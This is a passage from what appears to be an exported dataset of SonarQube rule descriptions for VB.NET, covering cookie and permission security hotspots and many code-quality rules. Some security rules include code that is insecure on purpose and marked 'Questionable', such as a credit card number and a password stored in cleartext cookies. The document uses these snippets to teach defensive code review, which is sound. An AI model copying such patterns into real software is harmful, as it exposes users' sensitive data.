myCookie(""CreditCardNumber"") = ""1234 1234 1234 1234"" ' Questionable
myCookie.Values(""password"") = ""5678"" ' Questionable
myCookie.Value = ""mysecret"" ' Questionable
...
Response.Cookies.Add(myCookie)

If Request.Cookies(""myCookie"") IsNot Nothing AndAlso Request.Cookies(""myCookie"")(""myValue"") IsNot Nothing Then ' Questionable
    Dim value As String = Request.Cookies(""myCookie"")(""myValue"") ' Questionable
    value = Request.Cookies(""myCookie"").Values(""myValue"") ' Questionable
End If

Dim value2 As String = Request.Cookies(""myCookie2"").Value ' Questionable

' === .NET Core ===
Response.Headers.Add(""Set-Cookie"", ...) ' Questionable
Response.Cookies.Append(""mykey"", ""myValue"") ' Questionable
</pre>
<h2>See</h2>
<ul>
  <li> <a href=""http://cwe.mitre.org/data/definitions/312.html"">MITRE, CWE-312</a> - Cleartext Storage of Sensitive Information </li>
  <li> <a href=""http://cwe.mitre.org/data/definitions/315.html"">MITRE, CWE-315</a> - Cleartext Storage of Sensitive Information in a Cookie </li>
  <li> <a href=""https://cwe.mitre.org/data/definitions/565.html"">MITRE CWE-565</a> - Reliance on Cookies without Validation and Integrity Checking
  </li>
  <li> OWASP Top 10 2017 Category A1 - Injection </li>
  <li> OWASP Top 10 2017 Category A3 - Sensitive Data Exposure </li>
  <li> <a href=""https://wiki.sei.cmu.edu/confluence/display/java/FIO52-J.+Do+not+store+unencrypted+sensitive+information+on+the+client+side"">CERT,
  FIO52-J.</a> - Do not store unencrypted sensitive information on the client side </li>
  <li> Derived from FindSecBugs rule <a href=""https://find-sec-bugs.github.io/bugs.htm#COOKIE_USAGE"">COOKIE_USAGE</a> </li>
</ul>",Using cookies is security-sensitive,[],MINOR,"['cert', 'cwe', 'owasp-a1', 'owasp-a3', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-11-29T11:10:38+0100,"<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999"">CVE-2018-12999</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285"">CVE-2018-10285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455"">CVE-2017-7455</a> </li>
</ul>
<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be
done properly.</p>
<p>This rule flags code that controls the access to resources and actions or configures this access. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> at least one accessed action or resource is security-sensitive. </li>
  <li> there is no access control in place or it does not cover all sensitive actions and resources. </li>
  <li> users have permissions they don't need. </li>
  <li> the access control is based on a user input or on some other unsafe data. </li>
  <li> permissions are difficult to remove or take a long time to be updated. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The first step is to restrict all sensitive actions to authenticated users.</p>
<p>Each user should have the lowest privileges possible. The access control granularity should match the sensitivity of each resource or action. The
more sensitive it is, the less people should have access to it. </p>
<p>Do not base the access control on a user input or on a value which might have been tampered with. For example, the developer should not read a
user's permissions from an HTTP cookie as it can be modified client-side.</p>
<p>Check that the access to each action and resource is properly restricted.</p>
<p>Enable administrators to swiftly remove permissions when necessary. This enables them to reduce the time an attacker can have access to your
systems when a breach occurs.</p>
<p>Log and monitor refused access requests as they can reveal an attack.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System.Threading
Imports System.Security.Permissions
Imports System.Security.Principal
Imports System.IdentityModel.Tokens

Class SecurityPrincipalDemo
    Class MyIdentity
        Implements IIdentity ' Questionable, custom IIdentity implementations should be reviewed
    End Class

    Class MyPrincipal
        Implements IPrincipal ' Questionable, custom IPrincipal implementations should be reviewed
    End Class

    &lt;System.Security.Permissions.PrincipalPermission(SecurityAction.Demand, Role:=""Administrators"")&gt; ' Questionable. The access restrictions enforced by this attribute should be reviewed.
    Private Shared Sub CheckAdministrator()
        Dim MyIdentity As WindowsIdentity = WindowsIdentity.GetCurrent() ' Questionable

        HttpContext.User = ... ' Questionable: review all reference (set and get) to System.Web HttpContext.User

        Dim domain As AppDomain = AppDomain.CurrentDomain
        domain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal) ' Questionable

        Dim identity As MyIdentity = New MyIdentity() ' Questionable
        Dim MyPrincipal As MyPrincipal = New MyPrincipal(MyIdentity) ' Questionable
        Thread.CurrentPrincipal = MyPrincipal ' Questionable
        domain.SetThreadPrincipal(MyPrincipal) ' Questionable

        Dim principalPerm As PrincipalPermission = New PrincipalPermission(Nothing, ""Administrators"")  ' Questionable
        principalPerm.Demand()

        Dim handler As SecurityTokenHandler = ...
        Dim identities As ReadOnlyCollection(Of ClaimsIdentity) = handler.ValidateToken()  ' Questionable, this creates identity
    End Sub

    ' Questionable: review how this function uses the identity and principal.
    Private Sub modifyPrincipal(ByVal identity As MyIdentity, ByVal principal As MyPrincipal)
    End Sub
End Class
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",vbnet:S4834,vbnet,VB.NET,"<p>Controlling permissions is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999"">CVE-2018-12999</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285"">CVE-2018-10285</a> </li>
  <li> <a href=""http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455"">CVE-2017-7455</a> </li>
</ul>
<p>Attackers can only damage what they have access to. Thus limiting their access is a good way to prevent them from wreaking havoc, but it has to be
done properly.</p>
<p>This rule flags code that controls the access to resources and actions or configures this access. The goal is to guide security code reviews.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> at least one accessed action or resource is security-sensitive. </li>
  <li> there is no access control in place or it does not cover all sensitive actions and resources. </li>
  <li> users have permissions they don't need. </li>
  <li> the access control is based on a user input or on some other unsafe data. </li>
  <li> permissions are difficult to remove or take a long time to be updated. </li>
</ul>
<p>You are at risk if you answered yes to the first question and any of the following ones.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>The first step is to restrict all sensitive actions to authenticated users.</p>
<p>Each user should have the lowest privileges possible. The access control granularity should match the sensitivity of each resource or action. The
more sensitive it is, the less people should have access to it. </p>
<p>Do not base the access control on a user input or on a value which might have been tampered with. For example, the developer should not read a
user's permissions from an HTTP cookie as it can be modified client-side.</p>
<p>Check that the access to each action and resource is properly restricted.</p>
<p>Enable administrators to swiftly remove permissions when necessary. This enables them to reduce the time an attacker can have access to your
systems when a breach occurs.</p>
<p>Log and monitor refused access requests as they can reveal an attack.</p>
<h2>Questionable Code Example</h2>
<pre>
Imports System.Threading
Imports System.Security.Permissions
Imports System.Security.Principal
Imports System.IdentityModel.Tokens

Class SecurityPrincipalDemo
    Class MyIdentity
        Implements IIdentity ' Questionable, custom IIdentity implementations should be reviewed
    End Class

    Class MyPrincipal
        Implements IPrincipal ' Questionable, custom IPrincipal implementations should be reviewed
    End Class

    &lt;System.Security.Permissions.PrincipalPermission(SecurityAction.Demand, Role:=""Administrators"")&gt; ' Questionable. The access restrictions enforced by this attribute should be reviewed.
    Private Shared Sub CheckAdministrator()
        Dim MyIdentity As WindowsIdentity = WindowsIdentity.GetCurrent() ' Questionable

        HttpContext.User = ... ' Questionable: review all reference (set and get) to System.Web HttpContext.User

        Dim domain As AppDomain = AppDomain.CurrentDomain
        domain.SetPrincipalPolicy(PrincipalPolicy.WindowsPrincipal) ' Questionable

        Dim identity As MyIdentity = New MyIdentity() ' Questionable
        Dim MyPrincipal As MyPrincipal = New MyPrincipal(MyIdentity) ' Questionable
        Thread.CurrentPrincipal = MyPrincipal ' Questionable
        domain.SetThreadPrincipal(MyPrincipal) ' Questionable

        Dim principalPerm As PrincipalPermission = New PrincipalPermission(Nothing, ""Administrators"")  ' Questionable
        principalPerm.Demand()

        Dim handler As SecurityTokenHandler = ...
        Dim identities As ReadOnlyCollection(Of ClaimsIdentity) = handler.ValidateToken()  ' Questionable, this creates identity
    End Sub

    ' Questionable: review how this function uses the identity and principal.
    Private Sub modifyPrincipal(ByVal identity As MyIdentity, ByVal principal As MyPrincipal)
    End Sub
End Class
</pre>
<h2>See</h2>
<ul>
  <li> OWASP Top 10 2017 Category A5 - Broken Access Control </li>
  <li> <a href=""https://www.sans.org/top25-software-errors/#cat3"">SANS Top 25</a> - Porous Defenses </li>
</ul>",Controlling permissions is security-sensitive,[],CRITICAL,"['owasp-a5', 'sans-top25-porous']",SECURITY_HOTSPOT
2018-11-06T12:16:59+0100,"<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Select Case variable
    Case 0
        doSomething()
    Case Else
        doSomethingElse()
End Select
</pre>
<h2>Compliant Solution</h2>
<pre>
If variable = 0 Then
    doSomething()
Else
    doSomethingElse()
End If
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause. </li>
  <li> MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause. </li>
  <li> MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses </li>
</ul>",vbnet:S1301,vbnet,VB.NET,"<p><code>switch</code> statements are useful when there are many different cases depending on the value of the same expression.</p>
<p>For just one or two cases however, the code will be more readable with <code>if</code> statements.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Select Case variable
    Case 0
        doSomething()
    Case Else
        doSomethingElse()
End Select
</pre>
<h2>Compliant Solution</h2>
<pre>
If variable = 0 Then
    doSomething()
Else
    doSomethingElse()
End If
</pre>
<h2>See</h2>
<ul>
  <li> MISRA C:2004, 15.5 - Every switch statement shall have at least one case clause. </li>
  <li> MISRA C++:2008, 6-4-8 - Every switch statement shall have at least one case-clause. </li>
  <li> MISRA C:2012, 16.6 - Every switch statement shall have at least two switch-clauses </li>
</ul>","""Select"" statements should have at least 3 ""Case"" clauses",[],MINOR,"['bad-practice', 'misra']",CODE_SMELL
2018-11-06T12:16:59+0100,"<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If Not (a = 2) Then  // Noncompliant
Dim b as Boolean = Not (i &lt; 10)  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
If a &lt;&gt; 2 Then
Dim b as Boolean = i &gt;= 10
</pre>",vbnet:S1940,vbnet,VB.NET,"<p>It is needlessly complex to invert the result of a boolean comparison. The opposite comparison should be made instead.</p>
<h2>Noncompliant Code Example</h2>
<pre>
If Not (a = 2) Then  // Noncompliant
Dim b as Boolean = Not (i &lt; 10)  // Noncompliant
</pre>
<h2>Compliant Solution</h2>
<pre>
If a &lt;&gt; 2 Then
Dim b as Boolean = i &gt;= 10
</pre>",Boolean checks should not be inverted,[],MINOR,['pitfall'],CODE_SMELL
2018-11-06T12:16:59+0100,"<p>The use of operators pairs ( <code>=+</code> or <code>=-</code>) where the reversed, single operator was meant (<code>+=</code> or <code>-=</code>)
will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code> or <code>=-</code> is used without any spacing between the two operators and when there is at least
one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim target As Integer = -5
Dim num As Integer = 3

target =- num ' Noncompliant; target = -3. Is that really what's meant?
target =+ num ' Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim target As Integer = -5
Dim num As Integer = 3

target = -num ' Compliant; intent to assign inverse value of num is clear
target += num
</pre>",vbnet:S2757,vbnet,VB.NET,"<p>The use of operators pairs ( <code>=+</code> or <code>=-</code>) where the reversed, single operator was meant (<code>+=</code> or <code>-=</code>)
will compile and run, but not produce the expected results.</p>
<p>This rule raises an issue when <code>=+</code> or <code>=-</code> is used without any spacing between the two operators and when there is at least
one whitespace character after.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim target As Integer = -5
Dim num As Integer = 3

target =- num ' Noncompliant; target = -3. Is that really what's meant?
target =+ num ' Noncompliant; target = 3
</pre>
<h2>Compliant Solution</h2>
<pre>
Dim target As Integer = -5
Dim num As Integer = 3

target = -num ' Compliant; intent to assign inverse value of num is clear
target += num
</pre>","""=+"" should not be used instead of ""+=""",[],MAJOR,[],BUG
2018-11-06T12:16:59+0100,"<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as
belonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving
the inner <code>switch</code> to another function.</p>",vbnet:S1821,vbnet,VB.NET,"<p>Nested <code>switch</code> structures are difficult to understand because you can easily confuse the cases of an inner <code>switch</code> as
belonging to an outer statement. Therefore nested <code>switch</code> statements should be avoided.</p>
<p>Specifically, you should structure your code to avoid the need for nested <code>switch</code> statements, but if you cannot, then consider moving
the inner <code>switch</code> to another function.</p>","""switch"" statements should not be nested",[],CRITICAL,['pitfall'],CODE_SMELL
2018-11-06T12:16:59+0100,"<p>Numbers can be shifted with the <code>&lt;&lt;</code> and <code>&gt;&gt;</code> operators, but the right operand of the operation needs to be an
<code>int</code> or a type that has an implicit conversion to <code>int</code>. However, with <code>dynamic</code>, the compiler's type checking is
turned off, so you can pass anything to a shift operator and have it compile. And if the argument can't be converted to <code>int</code> at runtime,
then a <code>RuntimeBinderException</code> will be raised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim o As Object = 5
Dim x As Integer = 5

x = o &gt;&gt; 5 ' Noncompliant
x = x &gt;&gt; o ' Noncompliant
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise when the left or the right expression is <code>Nothing</code>.</p>
<pre>
x = Nothing &gt;&gt; 5
x = 5 &gt;&gt; Nothing
</pre>",vbnet:S3449,vbnet,VB.NET,"<p>Numbers can be shifted with the <code>&lt;&lt;</code> and <code>&gt;&gt;</code> operators, but the right operand of the operation needs to be an
<code>int</code> or a type that has an implicit conversion to <code>int</code>. However, with <code>dynamic</code>, the compiler's type checking is
turned off, so you can pass anything to a shift operator and have it compile. And if the argument can't be converted to <code>int</code> at runtime,
then a <code>RuntimeBinderException</code> will be raised.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Dim o As Object = 5
Dim x As Integer = 5

x = o &gt;&gt; 5 ' Noncompliant
x = x &gt;&gt; o ' Noncompliant
</pre>
<h2>Exceptions</h2>
<p>This rule does not raise when the left or the right expression is <code>Nothing</code>.</p>
<pre>
x = Nothing &gt;&gt; 5
x = 5 &gt;&gt; Nothing
</pre>",Right operands of shift operators should be integers,[],CRITICAL,[],BUG
2018-11-06T12:16:59+0100,"<p>Marking a method with the <code>Pure</code> attribute specifies that the method doesn't make any visible changes; thus, the method should return a
result, otherwise the call to the method should be equal to no-operation. So <code>Pure</code> on a <code>void</code> method is either a mistake, or
the method doesn't do any meaningful task.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class Person
    Private age As Integer

    &lt;Pure&gt; ' Noncompliant. In this case the method makes a possibly visible state change
    Private Sub ConfigureAge(ByVal age As Integer)
        ...
        Me.age = age
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Person
    Private age As Integer

    Private Sub ConfigureAge(ByVal age As Integer)
        Me.age = age
    End Sub
End Class
</pre>",vbnet:S3603,vbnet,VB.NET,"<p>Marking a method with the <code>Pure</code> attribute specifies that the method doesn't make any visible changes; thus, the method should return a
result, otherwise the call to the method should be equal to no-operation. So <code>Pure</code> on a <code>void</code> method is either a mistake, or
the method doesn't do any meaningful task.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Class Person
    Private age As Integer

    &lt;Pure&gt; ' Noncompliant. In this case the method makes a possibly visible state change
    Private Sub ConfigureAge(ByVal age As Integer)
        ...
        Me.age = age
    End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Class Person
    Private age As Integer

    Private Sub ConfigureAge(ByVal age As Integer)
        Me.age = age
    End Sub
End Class
</pre>","Methods with ""Pure"" attribute should return a value",[],MAJOR,[],BUG
2018-11-06T12:16:59+0100,"<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://redirect.sonarsource.com/doc/cognitive-complexity.html"">Cognitive Complexity</a> </li>
</ul>",vbnet:S3776,vbnet,VB.NET,"<p>Cognitive Complexity is a measure of how hard the control flow of a function is to understand. Functions with high Cognitive Complexity will be
difficult to maintain.</p>
<h2>See</h2>
<ul>
  <li> <a href=""http://redirect.sonarsource.com/doc/cognitive-complexity.html"">Cognitive Complexity</a> </li>
</ul>",Cognitive Complexity of functions should not be too high,"[{'key': 'threshold', 'htmlDesc': 'The maximum authorized complexity.', 'defaultValue': '15', 'type': 'INTEGER'}, {'key': 'propertyThreshold', 'htmlDesc': 'The maximum authorized complexity in a property.', 'defaultValue': '3', 'type': 'INTEGER'}]",CRITICAL,['brain-overload'],CODE_SMELL
2018-11-06T12:16:59+0100,"<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>
<h2>Exceptions</h2>
<p>This rule ignores <code>Switch Case</code>s over <code>Enum</code>s and empty, fall-through cases.</p>",vbnet:S1479,vbnet,VB.NET,"<p>When <code>switch</code> statements have large sets of <code>case</code> clauses, it is usually an attempt to map two sets of data. A real map
structure would be more readable and maintainable, and should be used instead.</p>
<h2>Exceptions</h2>
<p>This rule ignores <code>Switch Case</code>s over <code>Enum</code>s and empty, fall-through cases.</p>","""Select Case"" statements should not have too many ""Case"" clauses","[{'key': 'maximum', 'htmlDesc': 'Maximum number of case', 'defaultValue': '30', 'type': 'INTEGER'}]",MAJOR,['brain-overload'],CODE_SMELL
2018-11-06T12:16:59+0100,"<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function NumberOfMinutes(ByVal hours As Integer) As Integer
    Dim seconds As Integer = 0 ' Seconds never used
    Return hours * 60
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function NumberOfMinutes(ByVal hours As Integer) As Integer
    Return hours * 60
End Function
</pre>
<h2>Exceptions</h2>
<p>Unused locally created resources in a <code>Using</code> statement are not reported.</p>
<pre>
Using t = New TestTimer()
End Using
</pre>",vbnet:S1481,vbnet,VB.NET,"<p>If a local variable is declared but not used, it is dead code and should be removed. Doing so will improve maintainability because developers will
not wonder what the variable is used for.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function NumberOfMinutes(ByVal hours As Integer) As Integer
    Dim seconds As Integer = 0 ' Seconds never used
    Return hours * 60
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function NumberOfMinutes(ByVal hours As Integer) As Integer
    Return hours * 60
End Function
</pre>
<h2>Exceptions</h2>
<p>Unused locally created resources in a <code>Using</code> statement are not reported.</p>
<pre>
Using t = New TestTimer()
End Using
</pre>",Unused local variables should be removed,[],MINOR,['unused'],CODE_SMELL
2018-11-06T12:16:59+0100,"<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function GetTitle(ByVal p As Person) As String
    Return If(p.Gender = Gender.MALE, ""Mr. "", If(p.IsMarried, ""Mrs. "", ""Miss "")) ' Noncompliant
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function GetTitle(ByVal p As Person) As String
    If p.Gender = Gender.MALE Then
        Return ""Mr. ""
    End If

    Return If(p.IsMarried, ""Mrs. "", ""Miss "")
End Function
</pre>",vbnet:S3358,vbnet,VB.NET,"<p>Just because you <em>can</em> do something, doesn't mean you should, and that's the case with nested ternary operations. Nesting ternary operators
results in the kind of code that may seem clear as day when you write it, but six months later will leave maintainers (or worse - future you)
scratching their heads and cursing.</p>
<p>Instead, err on the side of clarity, and use another line to express the nested operation as a separate statement.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Public Function GetTitle(ByVal p As Person) As String
    Return If(p.Gender = Gender.MALE, ""Mr. "", If(p.IsMarried, ""Mrs. "", ""Miss "")) ' Noncompliant
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Public Function GetTitle(ByVal p As Person) As String
    If p.Gender = Gender.MALE Then
        Return ""Mr. ""
    End If

    Return If(p.IsMarried, ""Mrs. "", ""Miss "")
End Function
</pre>",If operators should not be nested,[],MAJOR,['confusing'],CODE_SMELL
2018-11-06T12:16:59+0100,"<p>When declaring a Windows Communication Foundation (WCF) <code>OperationContract</code> method one-way, that service method won't return any result,
not even an underlying empty confirmation message. These are fire-and-forget methods that are useful in event-like communication. Specifying a return
type therefore does not make sense.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;ServiceContract&gt;
Interface IMyService
    &lt;OperationContract(IsOneWay:=True)&gt;
    Function SomethingHappened(ByVal parameter As Integer) As Integer ' Noncompliant
End Interface
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;ServiceContract&gt;
Interface IMyService
    &lt;OperationContract(IsOneWay:=True)&gt;
    Sub SomethingHappened(ByVal parameter As Integer)
End Interface
</pre>
<h2>Exceptions</h2>
<p>The rule doesn't report if <code>OperationContractAttribute.AsyncPattern</code> is set to <code>true</code>.</p>",vbnet:S3598,vbnet,VB.NET,"<p>When declaring a Windows Communication Foundation (WCF) <code>OperationContract</code> method one-way, that service method won't return any result,
not even an underlying empty confirmation message. These are fire-and-forget methods that are useful in event-like communication. Specifying a return
type therefore does not make sense.</p>
<h2>Noncompliant Code Example</h2>
<pre>
&lt;ServiceContract&gt;
Interface IMyService
    &lt;OperationContract(IsOneWay:=True)&gt;
    Function SomethingHappened(ByVal parameter As Integer) As Integer ' Noncompliant
End Interface
</pre>
<h2>Compliant Solution</h2>
<pre>
&lt;ServiceContract&gt;
Interface IMyService
    &lt;OperationContract(IsOneWay:=True)&gt;
    Sub SomethingHappened(ByVal parameter As Integer)
End Interface
</pre>
<h2>Exceptions</h2>
<p>The rule doesn't report if <code>OperationContractAttribute.AsyncPattern</code> is set to <code>true</code>.</p>","One-way ""OperationContract"" methods should have ""void"" return type",[],MAJOR,[],BUG
2018-11-06T12:16:58+0100,"<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<p>The <code>headerFormat</code> must end with an empty line if you want to have an empty line between the file header and the first line for your
source file (<code>using</code>, <code>namespace</code>...).</p>
<p>For example, if you want the source file to look like this</p>
<pre>
' Copyright (c) SonarSource. All Rights Reserved. Licensed under the LGPL License.  See License.txt in the project root for license information.

namespace Foo
{
}
</pre>
<p>then the <code>headerFormat</code> parameter should end with an empty line like this</p>
<pre>
' Copyright (c) SonarSource. All Rights Reserved. Licensed under the LGPL License.  See License.txt in the project root for license information.

</pre>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>",vbnet:S1451,vbnet,VB.NET,"<p>Each source file should start with a header stating file ownership and the license which must be used to distribute the application. </p>
<p>This rule must be fed with the header text that is expected at the beginning of every file.</p>
<p>The <code>headerFormat</code> must end with an empty line if you want to have an empty line between the file header and the first line for your
source file (<code>using</code>, <code>namespace</code>...).</p>
<p>For example, if you want the source file to look like this</p>
<pre>
' Copyright (c) SonarSource. All Rights Reserved. Licensed under the LGPL License.  See License.txt in the project root for license information.

namespace Foo
{
}
</pre>
<p>then the <code>headerFormat</code> parameter should end with an empty line like this</p>
<pre>
' Copyright (c) SonarSource. All Rights Reserved. Licensed under the LGPL License.  See License.txt in the project root for license information.

</pre>
<h2>Compliant Solution</h2>
<pre>
/*
 * SonarQube, open source software quality management tool.
 * Copyright (C) 2008-2013 SonarSource
 * mailto:contact AT sonarsource DOT com
 *
 * SonarQube is free software; you can redistribute it and/or
 * modify it under the terms of the GNU Lesser General Public
 * License as published by the Free Software Foundation; either
 * version 3 of the License, or (at your option) any later version.
 *
 * SonarQube is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 * Lesser General Public License for more details.
 *
 * You should have received a copy of the GNU Lesser General Public License
 * along with this program; if not, write to the Free Software Foundation,
 * Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 */
</pre>",Track lack of copyright and license headers,"[{'key': 'headerFormat', 'htmlDesc': 'Expected copyright and license header.', 'defaultValue': ""' SonarQube, open source software quality management tool.\n ' Copyright (C) 2008-2013 SonarSource\n ' mailto:contact AT sonarsource DOT com\n '\n ' SonarQube is free software; you can redistribute it and/or\n ' modify it under the terms of the GNU Lesser General Public\n ' License as published by the Free Software Foundation; either\n ' version 3 of the License, or (at your option) any later version.\n '\n ' SonarQube is distributed in the hope that it will be useful,\n ' but WITHOUT ANY WARRANTY; without even the implied warranty of\n ' MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n ' Lesser General Public License for more details.\n '\n ' You should have received a copy of the GNU Lesser General Public License\n ' along with this program; if not, write to the Free Software Foundation,\n ' Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA."", 'type': 'STRING'}, {'key': 'isRegularExpression', 'htmlDesc': 'Whether the headerFormat is a regular expression.', 'defaultValue': 'false', 'type': 'BOOLEAN'}]",BLOCKER,[],CODE_SMELL
2018-11-06T12:16:58+0100,"<p>When an assembly uses Windows Forms (classes and interfaces from the <code>System.Windows.Forms</code> namespace) its entry point should be marked
with the <code>STAThreadAttribute</code> to indicate that the threading model should be ""Single-Threaded Apartment"" (STA) which is the only one
supported by Windows Forms.</p>
<p>This rule raises an issue when the entry point (<code>Shared Sub Main</code> method) of an assembly using Windows Forms is not marked as STA.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Imports System.Windows.Forms

Public Class Foo
  Shared Sub Main()
    Dim winForm As Form = New Form
    Application.Run(winForm)
  End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports System.Windows.Forms

Public Class Foo
  &lt;STAThread()&gt; Shared Sub Main()
    Dim winForm As Form = New Form
    Application.Run(winForm)
  End Sub
End Class
</pre>",vbnet:S4210,vbnet,VB.NET,"<p>When an assembly uses Windows Forms (classes and interfaces from the <code>System.Windows.Forms</code> namespace) its entry point should be marked
with the <code>STAThreadAttribute</code> to indicate that the threading model should be ""Single-Threaded Apartment"" (STA) which is the only one
supported by Windows Forms.</p>
<p>This rule raises an issue when the entry point (<code>Shared Sub Main</code> method) of an assembly using Windows Forms is not marked as STA.</p>
<h2>Noncompliant Code Example</h2>
<pre>
Imports System.Windows.Forms

Public Class Foo
  Shared Sub Main()
    Dim winForm As Form = New Form
    Application.Run(winForm)
  End Sub
End Class
</pre>
<h2>Compliant Solution</h2>
<pre>
Imports System.Windows.Forms

Public Class Foo
  &lt;STAThread()&gt; Shared Sub Main()
    Dim winForm As Form = New Form
    Application.Run(winForm)
  End Sub
End Class
</pre>",Windows Forms entry points should be marked with STAThread,[],MAJOR,"['pitfall', 'winforms']",BUG
2018-11-06T12:16:58+0100,"<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed. </li>
  <li> It is not yet, or never will be, supported. In this case a <code>NotSupportedException</code> should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Sub DoSomething()
End Sub

Function DoSomething()
End Function
</pre>
<h2>Compliant Solution</h2>
<pre>
Sub DoSomething()
    ' Not implemented because of reason
End Sub

Function DoSomething()
    Throw New NotSupportedException
End Function
</pre>
<h2>Exceptions</h2>
<p>The following methods are ignored:</p>
<ul>
  <li> empty <code>Overridable</code> or <code>MustOverride</code> methods, </li>
  <li> empty methods that override an <code>MustOverride</code> method, </li>
  <li> empty overrides in test assemblies. </li>
</ul>",vbnet:S1186,vbnet,VB.NET,"<p>There are several reasons for a method not to have a method body:</p>
<ul>
  <li> It is an unintentional omission, and should be fixed. </li>
  <li> It is not yet, or never will be, supported. In this case a <code>NotSupportedException</code> should be thrown. </li>
  <li> The method is an intentionally-blank override. In this case a nested comment should explain the reason for the blank override. </li>
</ul>
<h2>Noncompliant Code Example</h2>
<pre>
Sub DoSomething()
End Sub

Function DoSomething()
End Function
</pre>
